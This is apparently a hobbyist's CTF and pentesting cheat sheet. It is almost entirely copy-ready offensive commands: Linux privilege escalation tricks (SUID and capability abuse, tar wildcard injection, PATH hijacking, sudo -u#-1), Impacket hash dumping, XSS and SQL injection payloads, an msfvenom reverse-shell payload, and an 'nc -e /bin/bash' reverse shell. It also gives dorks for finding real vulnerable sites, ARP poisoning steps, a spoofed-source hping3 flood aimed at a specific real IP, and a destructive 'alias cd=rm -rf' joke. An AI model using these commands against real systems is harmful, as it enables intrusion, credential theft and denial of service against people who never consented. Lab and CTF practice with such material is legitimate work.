## I used to forget stuff when doing CTF and things. I build these notes little by little to help me remember things I failed to remember. This note doesn't contain everything. Nevertheless, I hope it can be useful. 

**Box Notes**
1. Always check /etc/sudoers.d
2. Always check /etc/crontab

3. Always check capabilities >>> getcap -r / 2>/dev/null
Keep an eye on cap_setuid+ep or setuid capabilities mostly.
If there's thing like `/usr/bin/python3 = cap_setuid+ep`
We can just exploit that like `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")`


4. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
5. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
6. find / -user root -perm -4000 -print 2>/dev/null
7. find / -type f -perm -04000 -ls 2>/dev/null
8. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod +s /bin/bash` as root, bash -p
9. linpeas linenum pspy name ur shits
10. Always check `cat ~/.*history | less` or just `history`
11. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
12. Remember CVE-2019-13287 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
13. `.conf` file may contain something. (usually in /etc/apache2)
14. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
15. 
- SMB enum >>> smbclient -L //[IP](its_the_same_like_--list=[IP]), and continue with the shares name  smbclient //[IP]/[sharename]
- smbclient //[IP]/[sharename] --user=[username] --workgroup=[forest name] 
- smbclient -N //[IP]/[sharename]
16. rpcclient --user=[username] [target-ip] -W [forest name]
17. Check cdata
18. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
19. Always check `netstat -tulpn`
20. Enum smtp with telnet.


**Gdbuss Root SSH Privesc**
1. gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true
https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/


**Wild card privesc**
### When there's a script using `*`, for example to backup stuff. Usually in cronjob.
Example: 
In a cronjob there's 
`/usr/local/bin/backup.sh` with this inside it
```
cd /home/user
tar czf /tmp/backup.tar.gz *
```
We can exploit that function to execute all the script in the directory (in this case /home/user) to escalate our privilege
1. Create a script file in the /home/user for example
echo "chmod +s /bin/bash" > exploit.sh
2. touch /home/user/--checkpoint=1
3. touch /home/user/--checkpoint-action=exec=sh\ exploit.sh
4. The touch and checkpoint command will make the tar command to execute the exploit.sh which allow us to escalate our privilage


**Impacket**
1. GetNPUsers.py >> This script can check of the usernames are existing and if they have Kerberos pre-authentication enabled

Usage: `python3 ~/scripts/impacket/examples/GetNPUsers.py [Forest]/ -usersfile [List of username file] -outputfile hash.txt -dc-ip [TARGET IP] -format john` >> format john so then u can crack the existing user hash

2. secretsdump.py >> Performs various techniques to dump hashes from the remote machine without executing any agent there. (SAMHashes, LSASecrets, NTDSHashes)

Example: 
`python3 ~/scripts/impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL`
`~/scripts/impacket/examples/secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>`
and many more.. go research on it.


**PATH Privesc**
### When it is not run directly, example:
/usr/bin/cat >>> cant
cat >>> can
1. cd /tmp
2. echo "/bin/bash" > [the misconfigured]
3. chmod +x [the misconfigured]
4. export PATH=/tmp:$PATH
5. Execute the misconfigured binary

# In Bash versions < 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
/usr/sbin/service >>> can
1. function /usr/sbin/service { /bin/bash -p; }
2. export -f /usr/sbin/service
3. Execute the misconfigured binary

### Does not have to be in /tmp, u can create your own folder


**How to create environment variable**
1. export [varname]=[value]
2. echo $[varname]


**XSS**
1. <detail/open/ontoggle=alert()>
2. and bunch from portswigger..


**Little SQLI**
1. 'UNION SELECT 1,table_name,column_name FROM information_schema.columns -- -
2. 'UNION SELECT 1,group_concat(sql),3 FROM sqlite_master -- -


**Bufferoverflow**
1. Predict the size
2. msf-pattern_create.rb -l [the size] >>> we got the address
3. msf-pattern_offset.rb -l [the size] -q [the EIP address]
4. Generate shellcode
Example:
msfvenom -p windows/shell_reverse_tcp LHOST=[yourip] LPORT=[yourport] EXITFUNC=thread -f c -a x86 -b "\x00"

encode it with shikata_ga_nai if u want
-f >>> the output file language
-a >>> the architecture
-b >>> bad char

5. Got the shellcode, dont forget to put NOP'S '\x90'


**Fix your terminal**
1. python3 -c 'import pty;pty.spawn("/bin/bash");'
2. export TERM=xterm >>> so you can clear
3. ctrl + z >>> background
4. stty raw -echo
5. fg


**CTF Tools**
1. Forensics >> exiftool, volatility, zsteg, stegsolve, stegcracker, steghide
2. Way Back Machine can see everything, not only dead websites


**SSH with id_rsa**
1. chmod 600 id_rsa >>> for ours and ours alone 
2. ssh -i id_rsa [user]@[ip]


**Dorking**
1. Possible SQLi target >>> inurl:"product.php?id=" & intext:"You have an error in your SQL syntax"
2. Open FTP >>> "intitle: index of" inurl:ftp


**ARP**
Enable port forwarding
## echo 1 > /proc/sys/net/ipv4/ip_forward
### Poisoning
1. sudo arpspoof -i [interface] -t [target_ip] [gateway_ip]
2. sudo arpspoof -i [interface] -t [gateway] [target_ip]
Or just langsung pake -r (both direction)
1. sudo arpspoof -i [interface] -t [target_ip] -r [gateway_ip]

### Sniff
1. After poisoning, sniff packets with wireshark
2. Or just use bettercap and do this all automaticly tbh.


**Wireshark**
1. [FILTER] && [FILTER] && [FILTER] >>> Filtering stuff
Ex: ip.src == [IP] && http 
2. Follow the stream~


**Crunch**

## Generate wordlists with Crunch
Ex: 
Default charset is lowecase alphabet
- crunch [min-length] [max-lenth] ([charset] [option]) >>> optional
- crunch 2 4
- crunch 1 2 soni siu sia >>> min and max length is required but in this case wont be used.
- crunch 6 6 -t d%d%d% -p rara riri ruru >> d is the word location. The length will be more than 6. When we use -p length is just a formality/
- etc.. just read the man

## Important Options

Pattern (-t)
@ -> lowercase character
, -> uppercase character
% -> numbers
^ -> symbol
- crunch 7 7 -t @,%^123 -o wordlist.txt (notice that min-max length have to be the same as pattern length)

Charset (-f)
- Lookat the preset charsets in /usr/share/crunch/charset.lst
- crunch 2 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o ww.txt

**Random**
1. hashcat --example-hash >> or just visit the one in the web
2. diff -y [file1] [file2] >> compare file side by side
3. binary mode FTP is better
4. watch -n 0 [stuff you want to watch]
5. when we have admin in windows, and meterpreter shell, try
	`run post/windows/manage/enable_rdp `
	and conenct rdp. Fun commands
6. Veil msfconsole combo
Generate
msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
7. nc -e /bin/bash [ip] [port]
8. from binascii import unhexlify >> unhexlify to convert hex to string
9. hping3 DOS
	hping3 -S [host] -p ++[initial_port] >>> Port status discovery (open/not)
	hping3 -S [host] -p [port] -a [disguised_host] --flood
	hping3 -S [host] -p [port] -a [disguised_host] --flood --rand-source

	example: sudo hping3 -S 45.33.32.156 -p 80 -a 173.203.36.104 --flood --rand-source -V >>> -V for verbose
10. alias cd='rm -rf' >> LOL DONT DO THIS
11. ping and look at the TTL to find the target OS.

**OSINT**
1. Twitter is your friend
2. Wayback machine is a thing
3. Just use frickin sherlock if you have a username >>> python3 sherlock/ `username`